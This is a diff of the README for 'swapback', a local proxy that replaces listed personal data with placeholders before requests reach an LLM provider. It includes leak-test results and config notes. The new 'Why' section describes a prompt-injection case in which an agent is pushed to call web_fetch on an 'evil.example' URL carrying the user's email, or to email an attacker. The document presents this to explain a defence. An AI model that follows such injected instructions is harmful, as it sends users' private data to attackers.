@@ -15,23 +15,39 @@
 
 ## Why
 
-Agents and chat apps send everything to the model provider: names, emails, phone numbers, account numbers, API keys
-pasted into a log. Most of the time the model does not need the real value, only a stable stand-in for it.
+**A hijacked tool call can't carry your real data off the machine.** An agent reads a web page or an email with a
+prompt injection in it, and the model is told to call `web_fetch("https://evil.example/?q=<your email>")` or
+`send_email(to=attacker, body=<your contacts>)`. With swapback in front of the model, the model only ever had
+`«EMAIL_1»`, and a network, shell or send-style tool call keeps the placeholder unless you put that tool on an allow
+list. Tools you trust (your own calendar or send-as-me tool) get the real value back. From `swapback demo`:
 
-`swapback` sits on loopback between your client and an OpenAI-compatible API. It replaces the values you list and
-the patterns it detects with placeholders like `«PERSON_1»`, forwards the request, and puts the exact original text back
-into the answer, including streamed answers and tool-call arguments. Tool calls that could carry a value off your
-machine (web, shell and send-style tools, or any call with a URL in it) keep the placeholders by default. If anything goes
-wrong while scrubbing, the request is blocked, not sent.
+```text
+5) tool calls: the model asks to fetch a URL and to send an email
+   web_fetch  {"url": "https://lookup.example/?q=«EMAIL_1»"}        <- left as a placeholder: it never leaves
+   send_email {"to": "jane.doe@example.com", "body": "Hi, about Friday"}   <- on the allow list: real value restored
+```
 
+**Your list, no model needed, fails closed.** You list the names, emails, phones, IDs and addresses that matter;
+swapback swaps every written form of them (case, spacing, surname first, accent-free, phone groupings, JSON-escaped
+`\u00f8`, HTML entities) for placeholders like `«PERSON_1»`, forwards the request, and puts the original text back
+into the answer, including streamed answers and tool-call arguments. It is deterministic: exact matching plus
+patterns, three small dependencies, no NER model, no GPU. If a listed value is still readable after the swap, in any
+spelling the model could decode, or anything goes wrong while scrubbing, the request is blocked, not sent.
+
+- **Measured, and you can re-run it.** `swapback selftest` sends made-up listed values through 7 request paths and
+  prints the result. 0.4.2: 31/31 listed values caught, 0 of 630 forms leaked, 45/45 ordinary sentences untouched,
+  630/630 exact round trips. Unlisted values caught by the patterns alone: 6/8 (both unlisted names missed: there is
+  no NER). An independent holdout with different made-up data: 44/44 listed caught, 0 of 868 leaked, 46/47 ordinary
+  sentences untouched, 7/11 unlisted caught. See [Leak test](#leak-test-swapback-selftest).
 - **Byte-exact restore.** The reply gets back the string as you wrote it: same case, same phone format, same spacing.
-- **Fails closed.** A scrub error, an unreadable body, an empty known file or a known value still present after the
-  swap answers `503`, with a message in the API's own error shape that says what was blocked and why, so the agent
-  can show it, plus one log line on stderr.
-- **Agent-neutral.** Works with any client that lets you set a base URL. Tool-call arguments are restored for any tool,
-  except calls that look like network or shell egress, which keep placeholders unless you allow them
-  ([Tool calls](#tool-calls)).
-- **No model needed.** Exact matching plus patterns. No NER model, no GPU, three small dependencies.
+- **Fails closed, loudly.** A scrub error, an unreadable body, an empty known file or a known value still present after
+  the swap answers `503`, with a message in the API's own error shape that says what was blocked and why, so the agent
+  can show it, plus one log line on stderr. A known file that suddenly shrinks keeps the old values protected, logs a
+  warning and turns `/scrubber/health` to `"status": "warning"`, `"ok": false`.
+- **Agent-neutral.** Works with any client that lets you set a base URL: OpenAI Chat and Responses (Codex), Anthropic
+  Messages (Claude Code), JSON and streaming ([Tool calls](#tool-calls), [Framework recipes](#framework-recipes)).
+- **Not a replacement for NER.** Names you never listed go out as written. Use it alongside an NER tool if you need
+  that ([Use alongside other tools](#use-alongside-litellm-or-an-ner-tool)).
 
 <p align="center"><img src="https://raw.githubusercontent.com/rmpmrepo1278/swapback/main/docs/assets/before-after.svg" alt="The app sends real values, the provider sees placeholders, the app gets the real values back" width="100%"></p>
 
@@ -316,17 +332,20 @@ and has an environment override. Relative paths are relative to the config file.
 Renamed from pii-scrubber in 0.2.0: the old `PII_SCRUBBER_*` variables are still read when the `SWAPBACK_*` one is unset, but they are deprecated.
 
 Also: `tool_restore` (see [Tool calls](#tool-calls)), `hooks` (see [Hooks](#hooks)), `phone_regions`, `url_swap`, `patterns` (turn single detectors
-off, e.g. `{IP: false}`), `extra_secret_rules`, `log_requests`, `alert_min_interval_s`, `system_note`.
+off, e.g. `{IP: false}`), `common_names_title_case` (default `true`), `allow_empty_known`, `extra_secret_rules`, `log_requests`, `alert_min_interval_s`, `system_note`.
 
 **Known values** (`known.example.yaml`). The exact strings to swap, by type. The file is re-read whenever its content
 changes (also a save by rename); no restart needed. Guard rails, so a broken file never silently protects nothing:
 
 - A configured known file with no values blocks every request (set `allow_empty_known: true` if you mean it).
 - If a reload finds the file empty or less than half its previous size, the proxy keeps protecting the previous values
-  as well, sends an alert and lists a warning in `/scrubber/health`. Restart the proxy to accept a smaller list.
+  as well, prints a warning line on stderr, sends an alert and reports `"status": "warning"`, `"ok": false` in
+  `/scrubber/health`. Restart the proxy to accept a smaller list.
+- `swapback check-config` exits with code 2 when the known file has no values, so a script or CI step fails too.
 - `swapback check-config`, the proxy's start line and `/scrubber/health` warn when the made-up example values from
-  `swapback init` are still in the file, and when a listed name is also an ordinary phrase (`Will Hunt` also matches
-  "I will hunt for the keys", because matching ignores case). Warnings name line numbers, never values.
+  `swapback init` are still in the file, and when a listed name is also an ordinary phrase (`Will Hunt`). Such names are matched only when every word is
+  capitalised, so "I will hunt for the keys" is left alone; `common_names_title_case: false` matches them in any case.
+  Warnings name line numbers, never values.
 
 A listed name also matches surname first (`Doe, Jane Q`) and without accents (`Anais` for `Anaïs`); a listed ID also
 matches with its spaces and dashes removed (`QQ123456C` for `QQ 12 34 56 C`). Every variant shares the value's placeholder.
@@ -434,6 +453,23 @@ def extra_routes():
 
 `swapback check-config` lists the hook functions it found.
 
+## Use alongside LiteLLM or an NER tool
+
+swapback does one narrow thing: the values you listed never reach the provider in any spelling, tool calls that could
+send data out keep placeholders, and anything it can't check is blocked. It does not try to find names you never
+listed. It stacks with tools that do:
+
+- **Behind LiteLLM (or any gateway).** Point your app at swapback and set swapback's `upstream` to your LiteLLM proxy
+  (`upstream: http://127.0.0.1:4000`). LiteLLM keeps doing routing, keys, budgets and its Presidio guardrail for
+  unlisted names; swapback adds the listed-value guarantee, the tool-call egress policy and fail-closed behaviour
+  before anything reaches the gateway.
+- **With an NER proxy (PasteGuard, Kiji, Maskit, Veil's NER).** Chain them: app → swapback → NER proxy → provider.
+  swapback swaps your listed values first, so the NER pass only has to deal with what's left, and a missed listed
+  value blocks instead of depending on a model's recall. Put swapback first so the restore of exact values happens
+  last on the way back.
+- **With Presidio in your own code.** Use Presidio to find candidate names in your data, then add the ones you care
+  about to `known.yaml` (`swapback known init` merges a contacts export; `--scan` suggests more from your own files).
+
 ## Comparison
 
 Other open-source projects do the same job. This table reflects each project's own README and docs as read on
@@ -450,6 +486,10 @@ Other open-source projects do the same job. This table reflects each project's o
 | Streaming restore | OpenAI Chat and Responses, Anthropic Messages SSE | Yes | Yes (SSE) | Unclear per API | Unclear | Unclear |
 | Tool-call arguments | Real values for local tools; placeholders kept for web, shell and send-style tools and any call with a URL, by default; `tool_restore` allow/deny lists | Unclear | Unclear | Per-tool policy: unknown and network tools get pseudonyms | Restored for tools (LangChain middleware); per-tool policy unclear | Unclear |
 | On a scrub error | Fails closed (`503`) + egress re-check | Unclear | Unclear; documents a passthrough that forwards plaintext when masking is off or the app exits | Fails closed (`502`) + second guard | Unclear | Unclear |
+| Tool-call egress policy (a prompt-injected `web_fetch`/`send_email` can't carry real values out) | Yes, default on; streamed tool arguments held until the call is complete | Unclear | Unclear | Yes (per-tool policy) | Unclear | Unclear |
+| OpenAI Responses API streams restored | Yes (`/v1/responses`, Codex) | Unclear | Unclear | Unclear | Unclear | Unclear |
+| Fails closed on an empty or shrunk list, or a listed value left after the swap | Yes: blocks (empty), keeps old values + warns (shrunk), egress re-check on decoded text (`\uXXXX`, entities, `%XX`) | Unclear | Unclear | Fails closed on errors; list guard unclear | Unclear | Unclear |
+| Public, re-runnable leak test | `swapback selftest` (7 paths, numbers above) | No | No | No | No | No |
 | APIs | OpenAI Chat and Responses, Anthropic Messages (JSON and streaming) | OpenAI Chat + Responses, Anthropic, Codex | OpenAI, DeepSeek, Anthropic | Anthropic Messages, OpenAI Chat + Responses, Bedrock, Vertex, more | OpenAI and Anthropic connectors; LangChain, Pydantic AI, LlamaIndex, Claude Code integrations | OpenAI; Anthropic named in its diagram |
 | Beyond text | No; [hooks](#hooks) for spend caps and local fallback | Browser extension, dashboard, route-to-local-LLM mode | Image/PDF OCR redaction, browser extension, dashboard | Encrypted vault, DB seeding, shell-safe escaping, MCP DB tool | Agent-framework middleware, chat UI example | Desktop UI, Chrome extension |
 
@@ -495,7 +535,13 @@ Listing a value in `known.yaml` or `private_terms.yaml` covers any of these. The
   common API keys and a few local rules. National IDs other than the US SSN, free-form addresses, dates of birth in
   most label forms and many other formats are not detected unless you list them. See the measured score below.
 - **Whole words, case-insensitive.** `Jane` does not match `Janet`. Separator and case variants of a listed multi-word
-  value are caught (see How it works); nicknames, misspellings and other spellings need their own entries.
+  value are caught (see How it works), and so are its JSON-escaped (`S\u00f8ren`), HTML-entity and `%XX` spellings;
+  nicknames, misspellings and other spellings need their own entries. Commas and newlines also separate the parts of a
+  listed address, so the same address written over two lines is caught.
+- **Names that are ordinary words.** A listed name made only of common words ("Will Hunt", "Rose Marsh") is swapped
+  only when every word is capitalised, so "I will hunt for the keys" is left alone; a lower-case "will hunt" that
+  really is the person is then not swapped. `check-config` lists these names. Set `common_names_title_case: false` to
+  match them in any case (and accept the false positives).
 - **Variants and restore.** All written variants of one listed value share one placeholder. A reply gets back the forms
   written in the same request, in order of occurrence; a reply with more mentions than the request reuses the last one.
   With no request context (`restore_text` on its own, the CLI) the spelling from your known file comes back.
@@ -513,6 +559,40 @@ Listing a value in `known.yaml` or `private_terms.yaml` covers any of these. The
   wrong or vague.
 - **One vault, one machine.** Placeholders are stable across all conversations on one machine. It is a single-process
   tool meant to run next to the client on loopback.
+
+## Leak test (`swapback selftest`)
+
+```bash
+swapback selftest          # or: swapback selftest --json
+```
+
+It needs no config, key or network. A recording fake model and the proxy start on loopback ports with a fixed list of
+made-up values shipped in the package: 13 names (5 with accents, 4 that are also ordinary phrases), 4 emails, 7 phones
+(US, India, UK, Australia, Germany, France), 4 IDs and 3 addresses. Each value is sent in 2–5 written forms (as
+written, upper case, surname first, accent-free, other phone groupings, compact IDs, two-line addresses) through 7
+paths: OpenAI chat, chat streamed, chat with the value in tool-call arguments and a `json.dumps` tool result,
+Anthropic streamed, Anthropic `tool_use`/`tool_result`, Responses streamed and Responses
+`function_call`/`function_call_output`. The fake model echoes the user text, so the round trip is checked too. The
+leak check does not use swapback's matcher: it decodes JSON (nested), `\uXXXX`, HTML entities and `%XX` on the model
+side, folds case and accents, and looks for each value's name words, email, phone digits, ID characters and street line.
+
+0.4.2 on Python 3.11:
+
+```text
+swapback selftest: 31 made-up listed values, 90 written forms, 7 paths, 630 requests (2.4 s)
+  listed values caught (no form reached the model): 31/31 (100.0%)
+  forms leaked to the model:                        0 of 630 sent
+  ordinary sentences left untouched:                45/45 (100.0%)
+  exact round trips:                                630/630 (100.0%)
+  unlisted values caught by the pattern detectors:  6/8 (75.0%)  (reported, not a pass condition; names are never caught without a list)
+PASS
+```
+
+The same test against 0.4.1 (the selftest file copied into a 0.4.1 install): 24/31 caught, 50 of 630 forms leaked
+(accented names in JSON-escaped tool content, two-line addresses), 43/45 ordinary sentences untouched. With different
+made-up data (44 listed values, 47 ordinary sentences, 11 unlisted), 0.4.1 → 0.4.2: listed caught 34/44 → 44/44, forms
+leaked 78/868 → 0/868, ordinary sentences untouched 43/47 → 46/47 (the one left: "Lee, grace us with a song" matches a
+listed "Grace Lee" written surname first), unlisted caught 7/11 both times.
 
 ## Performance
 
@@ -590,6 +670,7 @@ See [CONTRIBUTING.md](https://github.com/rmpmrepo1278/swapback/blob/main/CONTRIB
 - More national ID and address patterns, with tests from synthetic data.
 - ~~Release on PyPI.~~ Done: `pip install swapback`.
 - ~~Hooks for spend caps, local fallback and usage accounting.~~ Done in 0.4.0.
+- ~~A public, re-runnable leak test.~~ Done in 0.4.2 (`swapback selftest`).
 
 Ideas and pull requests are welcome; open an issue first for anything large.
 
